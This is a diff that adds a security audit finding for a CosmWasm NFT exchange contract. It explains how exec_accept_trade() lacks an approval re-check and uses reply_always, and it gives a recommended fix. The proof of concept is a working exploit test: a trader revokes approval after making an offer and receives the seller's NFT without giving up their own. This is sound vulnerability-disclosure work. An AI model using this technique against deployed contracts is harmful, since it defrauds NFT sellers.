@@ -982,16 +982,208 @@ Also keep them in one file (state.rs) to avoid any confusion or oversight
 
 ### Description
 
-The bug occurs in ...
+exec_accept_trade() in src/contract.rs is called by a user who put up an NFT for sale/exchange, when they want to accept a user's
+offer of a trade for another NFT. The transfer is facilitated by submessages:
+```rust
+    // Asked
+    let mut submsgs = vec![SubMsg::reply_always(
+        WasmMsg::Execute {
+            contract_addr: config.nft_contract.to_string(),
+            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
+                recipient: trade.trader.to_string(),
+                token_id: trade.asked_id.clone(),
+            })?,
+            funds: vec![],
+        },
+        TRADE_REPLY,
+    )];
+
+    // Offered
+    submsgs.push(SubMsg::reply_always(
+        WasmMsg::Execute {
+            contract_addr: config.nft_contract.to_string(),
+            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
+                recipient: sale.owner.to_string(),
+                token_id: trade.to_trade_id.clone(),
+            })?,
+            funds: vec![],
+        },
+        TRADE_REPLY,
+    ));
+```
+
+A user extends an offer for a trade via exec_new_trade(), which does check that the exchange contract has been
+granted approval by the offerer before committing the offer to storage:
+```rust
+    // ensure contract have approval
+    let _: ApprovalResponse = deps
+        .querier
+        .query_wasm_smart(
+            config.nft_contract.to_string(),
+            &Cw721QueryMsg::Approval {
+                token_id: offered_id.clone(),
+                spender: env.contract.address.to_string(),
+                include_expired: None,
+            },
+        )
+        .unwrap();
+```
+exec_accept_trade() does not perform this same check before initiating a transfer; it only checks if the sale owner is
+the caller:
+```rust
+    if sale.owner != info.sender {
+        return Err(ContractError::Unauthorized {});
+    }
+```
+Also, its use of reply_always leads to a situation where exec_accept_trade() can succeed even if an error occurs in the transfer,
+ie the error does not "bubble up." [Here](https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md) is some relevant info about submessages
+
+Especially relevant:
+"Note, that error doesn't abort the whole transaction if and only if the reply is called - so in case of ReplyOn::Always and ReplyOn::Error. If the submessage is called with ReplyOn::Success (or ReplyOn::Never, which makes it effectively a normal message), the error in subsequent call would result in failing whole transaction and not commit the changes for it. The rule here is as follows: if for any reason you want your message handling to succeed on submessage failure, you always have to reply on failure."
 
 ### Recommendation
 
-The fix should be ...
+change exec_accept_trade() so it doesn't use reply_always:
+```rust
+    // Asked
+    let mut submsgs = vec![SubMsg::reply_on_success(
+        WasmMsg::Execute {
+            contract_addr: config.nft_contract.to_string(),
+            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
+                recipient: trade.trader.to_string(),
+                token_id: trade.asked_id.clone(),
+            })?,
+            funds: vec![],
+        },
+        TRADE_REPLY,
+    )];
+
+    // Offered
+    submsgs.push(SubMsg::reply_on_success(
+        WasmMsg::Execute {
+            contract_addr: config.nft_contract.to_string(),
+            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
+                recipient: sale.owner.to_string(),
+                token_id: trade.to_trade_id.clone(),
+            })?,
+            funds: vec![],
+        },
+        TRADE_REPLY,
+    ));
+```
+And also check that approval is still granted to the exchange contract, at the beginning of exec_accept_trade(),
+before the transfer logic.
 
 ### Proof of concept
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Create a new tradable sale
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::NewSale {
+                id: NFT1.to_string(),
+                price: Uint128::from(150u128),
+                tradable: true,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Create trade offer
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // immediately revoke approval to exchange contract
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // USER1 accepts trade
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr,
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: USER2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // we receive NFT1 as expected
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr.clone(),
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT1.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER2.to_string());
+
+        // but we still own NFT2 as well!
+        // they accepted our trade offer but never received it
+        // rugged
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr,
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT2.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER2.to_string());
+    }
 ```
 
 ---
